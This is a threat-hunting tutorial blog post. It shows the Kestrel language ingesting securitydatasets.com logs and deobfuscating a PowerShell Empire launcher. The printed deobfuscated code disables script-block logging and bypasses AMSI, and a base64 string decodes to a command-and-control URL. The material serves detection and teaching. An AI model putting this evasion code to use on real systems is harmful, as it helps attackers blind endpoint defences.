---
date: 2022-10-25
publishdate: 2022-10-25
published_url: "/posts/kestrel-sds-psd"
title: "Fun with securitydatasets.com and the Kestrel PowerShell Deobfuscator"
author: "Paul Coccoli"
publisher: "Open Cybersecurity Alliance"
featured_image: "/images/kestrel/huntflow.png"
summary: "Ready-made datasets from the Open Threat Research Forge meet Kestrel, featuring PowerShell Empire!"
tag: "blog"
---

Paul Coccoli &nbsp;·&nbsp; October 25, 2022 &nbsp;·&nbsp; 20 min read

The
[Kestrel](https://github.com/opencybersecurityalliance/kestrel-lang)
Threat Hunting Language is a novel "domain specific language" for
capturing and sharing threat hunts.  When getting started with
Kestrel, either [in a cloud
sandbox](https://opencybersecurityalliance.org/try-kestrel-in-a-cloud-sandbox/)
or a [local
install](https://kestrel.readthedocs.io/en/latest/installation/runtime.html),
you may want some example datasets to hunt against.  Example data is
useful both for learning [the
language](https://kestrel.readthedocs.io/en/latest/language.html) and
for testing your own [custom
analytics](https://opencybersecurityalliance.org/kestrel-custom-analytics/).

Luckily, the fine folks over at the [Open Threat Research Forge](https://github.com/OTRF) have created [securitydatasets.com](https://securitydatasets.com/introduction.html), a site (and github repo) that houses some nice datasets for threat hunting research.  In their own words:

> The Security Datasets project is an open-source initiatve that contributes malicious and benign datasets, from different platforms, to the infosec community to expedite data analysis and threat research.

As of version [1.4.1](https://github.com/opencybersecurityalliance/kestrel-lang/releases/tag/v1.4.1), Kestrel can now transparently use some of those datasets directly in a hunt.

**Table of Contents**

1. [Using Datasets From securitydatasets.com](#section:sds)
2. [The Empire Strikes...Something](#section:empire)
3. [Introducing the PowerShell Deobfuscator](#section:psd)
4. [Nesting Dolls](#section:nesting)

</br>
</br>

## <a name="section:sds"></a>Using Datasets From securitydatasets.com

securitydatasets.com stores host logs in their own JSON format (then zips them).  Most of the Windows datasets should be supported, and you can refer to them just like they were a STIX bundle.  For example, take a look at [Empire Mimikatz Extract Kerberos Keys](https://securitydatasets.com/notebooks/atomic/windows/credential_access/SDWIN-190518230752.html).  This page details an adversarial emulation run by OTRF, with the host events captured in zipfile in GitHub.  By using the "Host" link shown in the "Datasets Download", you can try using Kestrel for detecting this technique.  For a first step, try looking for some PowerShell processes:

```elixir
procs = GET process
        FROM https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_mimikatz_extract_keys.zip
        WHERE [process:binary_ref.name = 'powershell.exe']
```

Kestrel will download the zip file, unzip it, read in the JSON, transform it on the fly to STIX, then ingest it as if it were search results from [stix-shifter](https://github.com/opencybersecurityalliance/stix-shifter).

If you try out that command above, then `DISP procs` to see what Kestrel found, you might notice something interesting.  Once of those processes has a very long command line with what almost looks like random junk:

```shell
powershell.exe" -noP -sta -w 1 -enc SQBGACgA...RQBYAA==
```

Note that I've omitted a huge chunk of the command line, for both your sanity and mine.  So what's going on here?

## <a name="section:empire"></a>The Empire Strikes...Something

Take a look at the [Adversary View](https://securitydatasets.com/notebooks/atomic/windows/credential_access/SDWIN-190518230752.html#adversary-view) of the page where we got the dataset from.  What's this "Empire" stuff all about?  The "adversarial emulation" uses [Empire](https://github.com/BC-SECURITY/Empire):

> Empire is a post-exploitation and adversary emulation framework that is used to aid Red Teams and Penetration Testers.

One of the capabilities of this framework is PowerShell obfuscation;
it uses multiple [PowerShell obfuscation
techniques](https://www.offensive-security.com/offsec/powershell-obfuscation/)
to try to cover its tracks.  So what can Kestrel do to help us figure
out what this PowerShell process is actually doing?

## <a name="section:psd"></a>Introducing PowerShell Deobfuscator

The [PowerShell
Deobfuscator](https://github.com/opencybersecurityalliance/kestrel-analytics/tree/release/analytics/psd)
is a [Kestrel analytics
module](https://kestrel.readthedocs.io/en/latest/installation/analytics.html#kestrel-analytics-abstraction)
that attempts to undo some of the obfuscation techniques.  You can run
it like any other Kestrel analytics module, using the `APPLY` keyword:

```elixir
APPLY python://psd ON procs
```

`procs` will have a new attribute, `x_psd_deobfuscated`, that holds the deobfuscated portion of the command line.  What's even more useful is the display output: an HTML dump of the deofuscated code, properly indented for readability.  The display output should resemble this:

```powershell
if ($PSVERSIONTABLE.psversion.major -ge 3) {
    $ACE6 = [ref].assembly.gettype('System.Management.Automation.Utils').getfield('cachedGroupPolicySettings', 'NonPublic,Static');
    if ($ACE6) {
        $4c0d = $ACE6.getvalue($null);
        if ($4c0d['ScriptBlockLogging']) {
            $4c0d['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0;
            $4c0d['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
        }
        $VAL = [collections.generic.dictionary[string, system.object]]::new();
        $VAL.add('EnableScriptBlockLogging', 0);
        $VAL.add('EnableScriptBlockInvocationLogging', 0);
        $4c0d['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = $VAL
    }
    else {
        [scriptblock].getfield('signatures', 'NonPublic,Static').setvalue($null, (new-object collections.generic.hashset[string]))
    }
    $REF = [ref].assembly.gettype('System.Management.Automation.AmsiUtils');
    $REF.getfield('amsiInitFailed', 'NonPublic,Static').setvalue($null, $true);
    
}
```

A hunter can now scan the code and perhaps get some idea of what to look at next.

## <a name="section:nesting"></a>Nesting Dolls

What happens when the code that was base64-encoded itself use
base64-encoded data?  When `psd` notices this, it will unencode and
append the result as a comment:

```powershell
$SER = $([text.encoding]::unicode.getstring([convert]::frombase64string('aAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgA1AA==')));  # http://10.10.10.5
```

The line above, which is found inside a larger, obfuscated PowerShell script, is simply assigning a string value to the variable `$SER`.  That string value, however, has been base64-encoded just like the script that contains it.  The comment at the end of the line was added by `psd`, and is the unencoded version of `'aAB0...AA=='`.  As you can see, it's a URL (actually a portion of a URL; further on in the script a path will be appended).

In this dataset, it's a private IP address, so you can't really go much farther.  It may be a command and control server (possibly the one running Empire) or a staging site to download the next stage of the payload.  The "Adversary View" from the dataset page shows that the Empire PowerShell agent will run the `mimikatz` tool, so maybe that's the next payload stage?  It's an exercise left to the reader.

Happy hunting!